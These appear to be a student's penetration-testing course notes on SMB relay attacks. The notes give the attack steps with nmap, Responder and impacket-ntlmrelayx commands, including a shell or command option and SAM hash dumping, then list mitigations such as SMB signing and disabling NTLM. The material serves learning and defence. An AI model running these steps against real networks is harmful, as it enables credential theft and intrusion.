# SMB Relay Attacks Overview

- Instead of cracking hashes, we can relay the hash using SMB
- Requirements:
    - SMB signing must be disabled on the target
        - by default it is not enabled on workstations but it is on servers
    - Relayed user creds must be admin on machine to have value (local admin)
- Identify Hosts Without SMB Signing
    - nmap —script=smb2-security-mode.nse -p445 <ip>
        - looking for “enabled but not required”
    - Add to a file (mousepad targets.txt)
- Run Responder
    - sudo mousepad /etc/responder/Responder.conf
        - turn off SMB and HTTP
    - sudo responder -I eth0 -dP (will likely use tun0)
- Set up SMB Relay
    - sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support
    - I WILL USE: impacket-ntlmrelayx -tf targets.txt -smb2support
    - Options:
        - can add -i at the end to get an ip and port to nc to
            - nc <ip> <port>
        - commands
            - -c “<command>”
- Wait for traffic (on the lab, typed in attacker ip into file explorer)
- the impacket-ntlmrelayx terminal window will dump SAM Hashes
    - Save these hashes into a file

# SMB Relay Attack Defenses

- Mitigation Strategies
    - Enable SMB signing on all devices
        - pro: completely stops the attack
        - can: may decrease 10-20% of speed of file copies
    - Disable NTLM authentication on network
        - Pro: completely stops the attack
        - Cons: if Kerberos stops working, Windows will default to NTLM
    - Account Tiering:
        - Pro: limits domain admins to specific accounts
        - Cons: enforcing policy may be challenging
    - Local Admin Restriction
        - Pro: can prevent lateral movement
        - Cons: can increase service desk tickets
